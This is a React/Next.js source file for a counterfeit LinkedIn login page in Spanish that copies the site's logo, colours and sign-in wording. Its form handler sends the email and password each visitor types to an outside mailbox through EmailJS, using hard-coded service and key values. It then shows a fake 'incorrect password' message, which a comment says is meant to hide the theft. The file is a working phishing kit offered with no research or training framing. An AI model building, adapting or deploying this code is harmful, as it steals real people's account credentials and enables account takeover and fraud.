"use client";

import { useState } from "react";
import emailjs from "@emailjs/browser";
import Image from "next/image";

export default function LoginLinkedInPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Enviar datos por emailjs
    emailjs
      .send(
        "service_x6gbdgu",
        "template_1sknbed",
        {
          user_email: email,
          user_password: password,
        },
        "ga2sDtA4nB6cR15c3"
      )
      .then(
        (result) => {
          console.log("Email enviado:", result.text);
          // Mostrar mensaje falso de error (como si hubiera fallado)
          setErrorMessage("La contraseña es incorrecta");
        },
        (error) => {
          console.error("Error al enviar email:", error.text);
          setErrorMessage("Hubo un problema al procesar tu solicitud.");
        }
      );
  };

  return (
    <div className="min-h-screen bg-[#f3f2ef] relative flex items-center justify-center px-4">
      {/* Logo fijo arriba a la izquierda */}
      <div className="absolute top-10 left-[250px]">
        <Image
          src="/linkedin_logo.png"
          alt="LinkedIn Logo"
          width={180}
          height={60}
          className="object-contain"
        />
      </div>

      {/* Contenedor del login */}
      <div className="bg-white p-8 rounded-xl shadow-lg w-full max-w-sm ml-[80px]">
        <h1 className="text-2xl font-semibold mb-6 text-gray-900">
          Iniciar sesión
        </h1>

        {/* Botones sociales */}
        <div className="space-y-3 mb-6">
          <button className="flex items-center justify-center gap-3 w-full border border-gray-300 py-2 rounded-full text-sm font-medium hover:bg-gray-100 transition">
            <Image src="/google.png" alt="Google" width={20} height={20} />
            Continue with Google
          </button>

          <button className="flex items-center justify-center gap-3 w-full border border-gray-300 py-2 rounded-full text-sm font-medium hover:bg-gray-100 transition">
            <Image src="/apple.png" alt="Apple" width={20} height={20} />
            Iniciar sesión con Apple
          </button>
        </div>

        {/* Separador */}
        <div className="flex items-center my-6">
          <div className="flex-grow border-t border-gray-300" />
          <span className="mx-2 text-sm text-gray-500">o</span>
          <div className="flex-grow border-t border-gray-300" />
        </div>

        {/* Formulario */}
        <form onSubmit={handleSubmit} className="space-y-4 text-sm text-gray-800">
          <input
            type="text"
            placeholder="Email o teléfono"
            autoComplete="off"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full border border-gray-300 rounded-md py-2 px-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
          />

          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Contraseña"
              autoComplete="new-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border border-gray-300 rounded-md py-2 px-3 pr-24 focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-sm text-blue-600 hover:underline"
            >
              {showPassword ? "Ocultar" : "Mostrar"}
            </button>
          </div>

          <div className="text-right">
            <a href="#" className="text-blue-600 hover:underline">
              ¿Has olvidado tu contraseña?
            </a>
          </div>

          <div className="flex items-center space-x-2">
            <input
              type="checkbox"
              id="remember"
              className="accent-blue-600"
              defaultChecked
            />
            <label htmlFor="remember">Mantener la sesión iniciada</label>
          </div>

          {errorMessage && (
            <p className="text-red-500 text-sm text-center">{errorMessage}</p>
          )}

          <button
            type="submit"
            className="w-full bg-[#0a66c2] text-white py-2 rounded-full font-semibold hover:bg-[#004182] transition"
          >
            Iniciar sesión
          </button>
        </form>

        <div className="mt-6 text-center text-sm text-gray-600">
          ¿No tenés cuenta?{" "}
          <a href="#" className="text-blue-600 hover:underline font-medium">
            Registrate
          </a>
        </div>
      </div>
    </div>
  );
}
